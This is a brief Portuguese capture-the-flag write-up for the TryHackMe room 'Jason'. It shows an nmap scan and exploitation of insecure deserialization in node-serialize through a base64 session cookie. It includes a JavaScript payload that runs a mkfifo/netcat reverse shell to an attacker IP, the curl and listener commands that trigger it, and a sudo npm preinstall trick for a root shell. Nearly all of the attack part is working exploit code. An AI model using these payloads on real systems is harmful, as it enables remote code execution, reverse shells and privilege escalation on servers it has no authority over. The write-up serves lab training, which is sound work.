#ctf
# Jason
https://tryhackme.com/room/jason

## Reconhecimento do alvo e exploração
Realizando uma varredura de portas com nmap:

        PORT   STATE SERVICE
        22/tcp open  ssh
        80/tcp open  http

No site, ao enviar o email é adicionado um cookie em base64 que contem um json {"email":"test@email.com"}.
O site está vulneravel à deserialização insegura, com isso, basta colocar um script no valor do "email".

```js
var serialize = require('node-serialize');


x = {
email : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f", function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(x));

```
Convertendo a saída para base64, basta roda o codigo abaixo:

```sh
nc -lnvp 4444
curl -b "session=<base64_acima>" http://<IP>
```

## Privesc
É possível rodar "sudo -l" e ver que o __npm__ roda como superusuario, com isso basta rodar o comando tirado do GTFObins:

```sh
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

GG
